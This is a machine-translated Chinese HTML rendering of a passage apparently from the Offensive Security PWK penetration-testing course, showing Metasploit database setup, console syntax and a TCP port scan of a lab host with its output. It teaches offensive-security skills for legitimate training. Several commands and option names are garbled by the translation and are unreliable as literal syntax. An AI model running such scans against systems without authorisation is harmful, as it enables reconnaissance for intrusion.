</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:73080;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo systemctl 启用 postgresql</font></font></font></b></nobr></div>
<div style="position:absolute;top:73099;left:347"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 730 - 在启动时启动 postgresql</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:73128;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">随着数据库开始，我们需要创建和初始化数据库MSF </font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msfdb初始化</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为</font></font></nobr></div>
<div style="position:absolute;top:73148;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如下所示。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:73182;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo msfdb init</font></font></font></b></nobr></div>
<div style="position:absolute;top:73200;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[+] 创建数据库用户 'msf'</font></font></nobr></div>
<div style="position:absolute;top:73216;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[+] 创建数据库 'msf'</font></font></nobr></div>
<div style="position:absolute;top:73233;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[+] 创建数据库 'msf_test'</font></font></nobr></div>
<div style="position:absolute;top:73250;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[+] 创建配置文件 '/usr/share/metasploit-framework/config/database.yml'</font></font></nobr></div>
<div style="position:absolute;top:73267;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[+] 创建初始数据库模式</font></font></nobr></div>
<div style="position:absolute;top:73287;left:327"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 731 - 创建 Metasploit 数据库</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:73316;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">由于 Metasploit 正在不断发展，我们应该尽可能经常更新它。</font><font style="vertical-align: inherit;">之内</font></font></nobr></div>
<div style="position:absolute;top:73336;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Kali，我们可以用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">apt</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">更新 Metasploit </font><font style="vertical-align: inherit;">。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:73371;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo apt update; </font><font style="vertical-align: inherit;">sudo apt 安装 metasploit 框架</font></font></font></b></nobr></div>
<div style="position:absolute;top:73390;left:319"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 732 - 更新 Metasploit 框架</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:73419;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msfconsole</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">启动 Metasploit 命令行界面</font><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">该</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-q</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项可隐藏</font></font></nobr></div>
<div style="position:absolute;top:73439;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ASCII 艺术横幅和 Metasploit Framework 版本输出，如清单 733 所示：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:73473;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo msfconsole -q</font></font></font></b></nobr></div>
<div style="position:absolute;top:73507;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 &gt; </font></font></nobr></div>
<div style="position:absolute;top:73527;left:323"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 733 - 启动 Metasploit 框架</font></font></i></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:73558;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">22.1.1</font></font></i></nobr></div>
<div style="position:absolute;top:73558;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">熟悉 MSF 语法</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:73595;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Metasploit 框架包括数千个模块，分为几类。</font><font style="vertical-align: inherit;">这</font></font></nobr></div>
<div style="position:absolute;top:73615;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">类别显示在启动屏幕摘要上，但我们也可以通过</font><b><font style="font-size:13px"><font style="vertical-align: inherit;">show</font></font></b><font style="vertical-align: inherit;">查看它们</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"></font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:13px;font-family:Times">
<div style="position:absolute;top:73635;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-h</font></font></b><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令。</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:73669;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 &gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">显示 -h</font></font></font></b></nobr></div>
<div style="position:absolute;top:73686;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] "show" 命令的有效参数是：all、encoders、nops、exploits、payloa</font></font></nobr></div>
<div style="position:absolute;top:73703;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ds，辅助，帖子，插件，信息，选项 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:73831;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="63"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 63 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:73864;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:74941;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:74941;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:74941;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">680</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:73960;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 额外的模块特定参数有：missing、advanced、evasion、targets、ac</font></font></nobr></div>
<div style="position:absolute;top:73976;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">重刑</font></font></nobr></div>
<div style="position:absolute;top:73996;left:332"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 734 show 命令的帮助标志</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:74025;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">要激活模块，请输入</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">use</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">后跟模块名称（auxiliary/scanner/portscan/tcp in</font></font></nobr></div>
<div style="position:absolute;top:74045;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">下面的例子）。</font><font style="vertical-align: inherit;">此时，提示将指示活动模块。</font><font style="vertical-align: inherit;">我们可以使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">回</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">至</font></font></nobr></div>
<div style="position:absolute;top:74064;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">移出当前上下文并返回到主</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">提示：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:74099;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 &gt;</font><b><font color="#0070c0"><font style="vertical-align: inherit;">使用辅助/扫描器/</font></font></b><font style="vertical-align: inherit;">端口</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">扫描/tcp</font></font></font></b></nobr></div>
<div style="position:absolute;top:74133;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 辅助（扫描器/端口扫描/tcp）&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">返回</font></font></font></b></nobr></div>
<div style="position:absolute;top:74167;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 &gt;</font></font></nobr></div>
<div style="position:absolute;top:74186;left:318"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 735 - Metasploit 使用和返回命令</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:74215;left:109"><nobr><font style="vertical-align: inherit;"></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">back 的</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一个变体</font><font style="vertical-align: inherit;">是</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">previous</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，它会将我们切换回先前选择的模块</font></font></nobr></div>
<div style="position:absolute;top:74235;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">而不是主要提示：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:74270;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 &gt;</font><b><font color="#0070c0"><font style="vertical-align: inherit;">使用辅助/扫描器/</font></font></b><font style="vertical-align: inherit;">端口</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">扫描/tcp</font></font></font></b></nobr></div>
<div style="position:absolute;top:74304;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 辅助（扫描器/端口扫描/tcp）&gt;</font><b><font color="#0070c0"><font style="vertical-align: inherit;">使用辅助/扫描器/</font></font></b><font style="vertical-align: inherit;">端口扫描</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/syn</font></font></font></b></nobr></div>
<div style="position:absolute;top:74338;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 辅助（扫描器/端口扫描/同步）&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">上一个</font></font></font></b></nobr></div>
<div style="position:absolute;top:74372;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 辅助（扫描器/端口扫描/tcp）&gt;</font></font></nobr></div>
<div style="position:absolute;top:74391;left:335"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 736 - Metasploit 上一个命令</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:74420;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">大多数模块</font><font style="vertical-align: inherit;">在运行之前</font><font style="vertical-align: inherit;">需要选项（</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">显示选项</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">）。</font><font style="vertical-align: inherit;">我们可以配置这些</font></font></nobr></div>
<div style="position:absolute;top:74440;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">带有</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">set</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">unset 的</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项，</font><font style="vertical-align: inherit;">也可以</font><font style="vertical-align: inherit;">用</font><b><font style="font-size:13px"><font style="vertical-align: inherit;">setg</font></font></b><font style="vertical-align: inherit;">或</font><b><font style="font-size:13px"><font style="vertical-align: inherit;">unsetg</font></font></b><font style="vertical-align: inherit;">设置和删除</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">全局选项</font></font></i><font style="vertical-align: inherit;"></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"></font></font></b><font style="vertical-align: inherit;"></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"></font></font></b></nobr></div>
<div style="position:absolute;top:74459;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">分别。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:74494;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 辅助（扫描器/端口扫描/tcp）&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">显示选项</font></font></font></b></nobr></div>
<div style="position:absolute;top:74528;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">模块选项（auxiliary/scanner/portscan/tcp）：</font></font></nobr></div>
<div style="position:absolute;top:74562;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">名称    </font></font></nobr></div>
<div style="position:absolute;top:74562;left:238"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">当前设置 需要 说明</font></font></nobr></div>
<div style="position:absolute;top:74579;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">----    </font></font></nobr></div>
<div style="position:absolute;top:74579;left:238"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">--------------- -------- -----------</font></font></nobr></div>
<div style="position:absolute;top:74596;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">货币 10    </font></font></nobr></div>
<div style="position:absolute;top:74596;left:376"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是 每个要检查的并发端口数</font></font></nobr></div>
<div style="position:absolute;top:74613;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">延迟    </font></font></nobr></div>
<div style="position:absolute;top:74613;left:238"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0    </font></font></nobr></div>
<div style="position:absolute;top:74613;left:376"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是每个线程的连接之间的延迟， </font></font></nobr></div>
<div style="position:absolute;top:74630;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">抖动 0    </font></font></nobr></div>
<div style="position:absolute;top:74630;left:376"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是 延迟抖动因子（最大值由 w</font></font></nobr></div>
<div style="position:absolute;top:74647;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">港口    </font></font></nobr></div>
<div style="position:absolute;top:74647;left:238"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1-10000    </font></font></nobr></div>
<div style="position:absolute;top:74647;left:376"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是要扫描的端口（例如 22-25,80,110-900）</font></font></nobr></div>
<div style="position:absolute;top:74664;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主机    </font></font></nobr></div>
<div style="position:absolute;top:74664;left:376"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是 目标地址范围或 CIDR 标识符</font></font></nobr></div>
<div style="position:absolute;top:74681;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">线程 1    </font></font></nobr></div>
<div style="position:absolute;top:74681;left:376"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是 并发线程数</font></font></nobr></div>
<div style="position:absolute;top:74698;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">超时 1000    </font></font></nobr></div>
<div style="position:absolute;top:74698;left:376"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是 以毫秒为单位的套接字连接超时 </font></font></nobr></div>
<div style="position:absolute;top:74717;left:299"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 737 - 辅助/扫描器/端口扫描/tcp 的选项</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:74746;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">例如，使用scanner/portscan/tcp 对我们的Windows 工作站执行扫描</font></font></nobr></div>
<div style="position:absolute;top:74766;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">模块，我们必须首先</font><font style="vertical-align: inherit;">使用</font><b><font style="font-size:13px"><font style="vertical-align: inherit;">set</font></font></b><font style="vertical-align: inherit;">命令</font><font style="vertical-align: inherit;">设置远程主机 IP 地址（</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">RHOSTS</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">）</font><font style="vertical-align: inherit;">。</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"></font></font></b><font style="vertical-align: inherit;"></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:74801;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 辅助（扫描器/端口扫描/tcp）&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设置 RHOSTS 10.11.0.22</font></font></font></b></nobr></div>
<div style="position:absolute;top:74818;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">RHOSTS =&gt; 10.11.0.22</font></font></nobr></div>
<div style="position:absolute;top:74837;left:356"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 738 - 设置 RHOSTS 选项</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:74867;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">配置模块后，我们可以</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">运行</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">它：</font></font></nobr></div>
</span></font>

<div style="position:absolute;top:75019;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="64"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 64 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:75052;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:76129;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:76129;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:76129;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">681</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:75150;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 辅助（扫描器/端口扫描/tcp）&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">运行</font></font></font></b></nobr></div>
<div style="position:absolute;top:75184;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[+] 10.11.0.22: - 10.11.0.22:80 - TCP 开放</font></font></nobr></div>
<div style="position:absolute;top:75201;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[+] 10.11.0.22: - 10.11.0.22:135 - TCP 开放</font></font></nobr></div>
<div style="position:absolute;top:75218;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[+] 10.11.0.22: - 10.11.0.22:139 - TCP 开放</font></font></nobr></div>
<div style="position:absolute;top:75235;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[+] 10.11.0.22: - 10.11.0.22:445 - TCP 开放</font></font></nobr></div>
<div style="position:absolute;top:75252;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[+] 10.11.0.22: - 10.11.0.22:3389 - TCP 开放</font></font></nobr></div>
<div style="position:absolute;top:75268;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[+] 10.11.0.22: - 10.11.0.22:5040 - TCP 开放</font></font></nobr></div>
<div style="position:absolute;top:75285;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[+] 10.11.0.22: - 10.11.0.22:9121 - TCP 开放</font></font></nobr></div>
<div style="position:absolute;top:75303;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 扫描了 1 个主机中的 1 个（100% 完成）</font></font></nobr></div>
<div style="position:absolute;top:75320;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 辅助模块执行完成</font></font></nobr></div>
<div style="position:absolute;top:75339;left:333"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 739 - 使用 Metasploit 进行端口扫描</font></font></i></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:75370;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">22.1.2</font></font></i></nobr></div>
<div style="position:absolute;top:75370;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Metasploit 数据库访问</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:75408;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果 postgresql 服务正在运行，Metasploit 将记录发现和有关已发现的信息</font></font></nobr></div>
<div style="position:absolute;top:75427;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">方便、可访问的数据库中的主机、服务或凭据。</font></font></nobr></div>
<div style="position:absolute;top:75460;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在下面的清单中，数据库已经填充了我们运行的 TCP 扫描的结果</font></font></nobr></div>
<div style="position:absolute;top:75479;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">上一节。</font><font style="vertical-align: inherit;">我们可以使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">services</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令</font><font style="vertical-align: inherit;">显示这些结果</font><font style="vertical-align: inherit;">：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:75514;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 辅助（扫描器/端口扫描/tcp）&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">服务</font></font></font></b></nobr></div>
<div style="position:absolute;top:75548;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">服务</font></font></nobr></div>
<div style="position:absolute;top:75565;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">========</font></font></nobr></div>
<div style="position:absolute;top:75599;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主持人    </font></font></nobr></div>
<div style="position:absolute;top:75599;left:247"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">端口原型名称状态信息</font></font></nobr></div>
<div style="position:absolute;top:75616;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">----    </font></font></nobr></div>
<div style="position:absolute;top:75616;left:247"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">---- ----- ---- ----- ----</font></font></nobr></div>
<div style="position:absolute;top:75633;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.0.22 80 tcp    </font></font></nobr></div>
<div style="position:absolute;top:75633;left:400"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">打开   </font></font></nobr></div>
<div style="position:absolute;top:75650;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.0.22 135 tcp    </font></font></nobr></div>
<div style="position:absolute;top:75650;left:400"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">打开   </font></font></nobr></div>
<div style="position:absolute;top:75667;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.0.22 139 tcp    </font></font></nobr></div>
<div style="position:absolute;top:75667;left:400"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">打开   </font></font></nobr></div>
<div style="position:absolute;top:75684;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.0.22 445 tcp    </font></font></nobr></div>
<div style="position:absolute;top:75684;left:400"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">打开   </font></font></nobr></div>
<div style="position:absolute;top:75701;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.0.22 3389 tcp    </font></font></nobr></div>
<div style="position:absolute;top:75701;left:400"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">打开   </font></font></nobr></div>
<div style="position:absolute;top:75718;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.0.22 5040 tcp    </font></font></nobr></div>
<div style="position:absolute;top:75718;left:400"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">打开   </font></font></nobr></div>
<div style="position:absolute;top:75735;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.0.22 9121 TCP    </font></font></nobr></div>
<div style="position:absolute;top:75735;left:400"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">打开   </font></font></nobr></div>
<div style="position:absolute;top:75754;left:314"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 740 - 数据库中的 TCP 端口扫描结果</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:75784;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">基本</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">服务</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令显示所有结果，但我们也可以按端口号 ( </font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-p</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> )</font><font style="vertical-align: inherit;">过滤</font><font style="vertical-align: inherit;">，</font></font></nobr></div>
